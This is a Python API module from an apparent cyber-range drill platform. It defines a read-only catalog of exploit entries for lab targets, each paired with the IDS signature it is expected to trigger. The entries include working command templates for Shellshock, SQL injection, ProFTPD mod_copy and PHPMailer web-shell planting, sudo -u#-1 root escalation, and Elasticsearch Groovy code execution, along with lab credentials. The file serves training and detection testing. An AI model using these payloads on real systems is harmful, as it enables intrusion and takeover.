"""Editable IF-01 action catalog and V1.0 reference entries."""
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, ConfigDict, Field

import repository as repo

router = APIRouter(prefix='/validation/action-mappings')
COLLECTION = 'validation_action_mappings'
CATALOG = 'catalog'
DEFAULT_VERSION = 'validation/1'
REFERENCE_ACTIONS = {
    'DiscoverRemoteSystems': ('发现远程系统', '1'),
    'ServiceDiscovery': ('服务发现', '激进 1 / 隐蔽 3'),
    'DiscoverDeception': ('发现诱饵', '2'),
    'ExploitRemoteService': ('远程服务利用', '4'),
    'PrivilegeEscalate': ('权限提升', '2'),
    'DegradeServices': ('服务降质', '2'),
    'Impact': ('影响', '2'),
    'Withdraw': ('撤离', '1'),
    'Sleep': ('等待', '1'),
}

# CSLE 复刻靶标的 exploit 条目（C5 收口 2026-11-25）：命令模板 + 成功判据 + 预期告警 sid，
# 素材取 C2–C4 已实测触发命令。带 simulation_steps（文档对照语义，受理时明确拒绝执行）
# ——通用命令模板执行器为独立后续项，落地后再摘掉该标记接入执行。
# 预期告警对照见 offline/rules/CSLE签名对照.md（DRILL 自定义规则 sid 10001xx 段）。
CSLE_EXPLOIT_ENTRIES = {
    'ExploitCsleShellshock': {
        'action_name': 'ExploitCsleShellshock',
        'label': 'CSLE Shellshock 利用',
        'description': 'CVE-2014-6271 靶标（target-csle-shellshock, 80/cgi-bin/vulnerable）',
        'exploit_id': 'csle-shellshock',
        'cve': ['CVE-2014-6271'],
        'command_template': "curl -s -H 'User-Agent: () { :; }; /bin/touch /tmp/pwn' http://{target_ip}/cgi-bin/vulnerable",
        'success_criteria': '靶机容器内 /tmp/pwn 生成（www-data 命令执行；注入命令用绝对路径，cgid PATH 无 /usr/bin）',
        'expected_alerts': ['Talos 1:31978 OS-OTHER Bash CGI environment variable injection attempt (http_header)'],
        'simulation_steps': '1',
    },
    'ExploitCsleHeartbleed': {
        'action_name': 'ExploitCsleHeartbleed',
        'label': 'CSLE Heartbleed 探测',
        'description': 'CVE-2014-0160 靶标（target-csle-heartbleed, openssl 1.0.1e s_server 443）',
        'exploit_id': 'csle-heartbleed',
        'cve': ['CVE-2014-0160'],
        'command_template': 'nmap --script ssl-heartbleed -p 443 {target_ip}',
        'success_criteria': 'nmap 输出 VULNERABLE（心跳响应泄漏内存）',
        'expected_alerts': ['Talos 1:30514-30517/30777 系 SERVER-OTHER OpenSSL large heartbeat response（响应侧 to_client，443）'],
        'simulation_steps': '1',
    },
    'ExploitCsleSqli': {
        'action_name': 'ExploitCsleSqli',
        'label': 'CSLE SQL 注入利用',
        'description': 'SQL 注入靶标（target-csle-sqli, 80/login, 自写精简应用, 注入类无 CVE 编号）',
        'exploit_id': 'csle-sqli',
        'cve': [],
        'command_template': "curl -s -X POST -d \"username=' OR '1'='1' -- &password=x\" http://{target_ip}/login.php  # 拖库: username=' UNION SELECT secret,data FROM secrets -- ",
        'success_criteria': '响应出现登录绕过（Welcome + 用户列表）；UNION 拖库返回 FLAG{sql_injection_docked}',
        'expected_alerts': ['DRILL 1:1000101（sqli OR 1=1 注入特征）'],
        'simulation_steps': '1',
    },
    'ExploitCsleProftpd3306': {
        'action_name': 'ExploitCsleProftpd3306',
        'label': 'CSLE ProFTPD mod_copy 利用',
        'description': 'CVE-2015-3306 靶标（target-csle-proftpd-3306, 21 ftp + 80 http）',
        'exploit_id': 'csle-proftpd-3306',
        'cve': ['CVE-2015-3306'],
        'command_template': "ftp 凭据 victim/ftp3306 登录 → SITE CPFR /opt/payload.php → SITE CPTO /var/www/html/x.php → curl 'http://{target_ip}/x.php?c=id'",
        'success_criteria': 'GET /x.php?c=id 返回 uid=33(www-data)——mod_copy 搬运 payload 成 RCE',
        'expected_alerts': ['DRILL 1:1000102（SITE CPFR mod_copy 特征, ftp 21）'],
        'simulation_steps': '1',
    },
    'ExploitCslePhpmailer10033': {
        'action_name': 'ExploitCslePhpmailer10033',
        'label': 'CSLE PHPMailer 利用',
        'description': 'CVE-2016-10033 靶标（target-csle-phpmailer-10033, 80, webroot=/www）',
        'exploit_id': 'csle-phpmailer-10033',
        'cve': ['CVE-2016-10033'],
        'command_template': 'bash /opt/exploit.sh {target_ip}  # 镜像内置原版 opsxcq exploit.sh（multipart POST sender 注入 -X 写 /www/backdoor.php）',
        'success_criteria': 'GET http://{target_ip}/backdoor.php?cmd=id 返回 uid=33（Subject 原文执行）',
        'expected_alerts': ['DRILL 1:1000103（sender 注入 -X 写 backdoor.php 特征）'],
        'simulation_steps': '1',
    },
    'ExploitCsleSudo0426': {
        'action_name': 'ExploitCsleSudo0426',
        'label': 'CSLE sudo 提权',
        'description': '老版本 sudo 提权靶标（target-csle-sudo-0426, 22 sshd, 凭据 victim/ftp3306）',
        'exploit_id': 'csle-sudo-0426',
        'cve': ['CVE-2010-0426', 'CVE-2019-14287'],
        'command_template': "ssh victim@{target_ip}  # 凭据 ftp3306, ssh 会话天然带 tty → sudo -u#-1 find -exec id \\;",
        'success_criteria': '输出 uid=0(root)——CVE-2019-14287 语义（sudo -u#-1 绕过用户限制；1.7.2/1.8.13 均受影响）',
        'expected_alerts': [],
        'alert_note': '本地提权不产生网络特征（SSH 加密隧道内），IDS 侧无预期告警——演练判定只看命令输出',
        'simulation_steps': '1',
    },
    'ExploitCsleEs1427': {
        'action_name': 'ExploitCsleEs1427',
        'label': 'CSLE Elasticsearch Groovy 利用',
        'description': 'CVE-2015-1427 靶标（target-csle-es1427, 9200, ES 1.4.2 + openjdk8）',
        'exploit_id': 'csle-es1427',
        'cve': ['CVE-2015-1427'],
        'command_template': "POST http://{target_ip}:9200/_search body: {\"script_fields\":{\"exp\":{\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}",
        'success_criteria': '响应 fields.exp.value 回显 uid=0(java)——Groovy 沙箱绕过 RCE（需有样例文档, 由 startup 写入 blog/user 索引）',
        'expected_alerts': ['DRILL 1:1000104（_search script_fields getRuntime 特征, 9200）'],
        'simulation_steps': '1',
    },
}


class ActionMapping(BaseModel):
    model_config = ConfigDict(extra='forbid', str_strip_whitespace=True)
    action_name: str = Field(pattern=r'^[A-Za-z][A-Za-z0-9_.-]{0,63}$')
    label: str = Field(min_length=1, max_length=64)
    description: str = Field(default='', max_length=400)


def catalog():
    record = repo.read(COLLECTION, CATALOG)
    if record is None:
        defaults = {'revision': 3, 'reference_seeded': True, 'exploit_seeded': True, 'items': {
            'HttpServiceCheck': {
                'action_name': 'HttpServiceCheck',
                'label': 'HTTP 服务验证',
                'description': '检查拓扑中已标记的 HTTP 目标服务。',
            },
        }}
        _add_reference_entries(defaults)
        _add_exploit_entries(defaults)
        return defaults
    if record.get('reference_seeded') and record.get('exploit_seeded'):
        return record
    with repo.transaction():
        record = repo.read(COLLECTION, CATALOG)
        migrated = False
        if not record.get('reference_seeded'):
            _add_reference_entries(record)
            record['reference_seeded'] = True
            migrated = True
        if not record.get('exploit_seeded'):
            _add_exploit_entries(record)
            record['exploit_seeded'] = True
            migrated = True
        if migrated:
            _save(record)  # 一次迁移统一涨一版（_save 内 revision += 1）
    return record


def _add_reference_entries(record):
    for name, (label, steps) in REFERENCE_ACTIONS.items():
        entry = record['items'].setdefault(name, {'action_name': name, 'label': label, 'description': ''})
        entry['simulation_steps'] = steps


def _add_exploit_entries(record):
    """CSLE exploit 条目随代码版本刷新（字典只读，代码是唯一权威来源）。"""
    for name, entry in CSLE_EXPLOIT_ENTRIES.items():
        record['items'][name] = dict(entry)


def _entry(mapping, previous=None):
    payload = mapping.model_dump()
    reference = REFERENCE_ACTIONS.get(mapping.action_name)
    steps = reference[1] if reference else (previous or {}).get('simulation_steps')
    if steps:
        payload['simulation_steps'] = steps
    return payload


def dictionary_version(record):
    return f"validation/{record['revision']}"


def _save(record):
    record['revision'] += 1
    repo.put(COLLECTION, CATALOG, record)


@router.get('')
def list_mappings():
    record = catalog()
    items = sorted(record['items'].values(), key=lambda item: item['action_name'].casefold())
    return {'data': {'dictionary_version': dictionary_version(record), 'items': items}}


@router.post('', status_code=201)
def create_mapping(mapping: ActionMapping):
    # 动作映射编辑已关闭（字典只读）：IF-01 受理语义依赖稳定的字典版本，线上不接受运行期增删
    raise HTTPException(403, '动作映射编辑已关闭（字典只读）')


@router.put('/{action_name}')
def update_mapping(action_name: str, mapping: ActionMapping):
    # 动作映射编辑已关闭（字典只读）：IF-01 受理语义依赖稳定的字典版本，线上不接受运行期增删
    raise HTTPException(403, '动作映射编辑已关闭（字典只读）')


@router.delete('/{action_name}')
def delete_mapping(action_name: str):
    # 动作映射编辑已关闭（字典只读）：IF-01 受理语义依赖稳定的字典版本，线上不接受运行期增删
    raise HTTPException(403, '动作映射编辑已关闭（字典只读）')
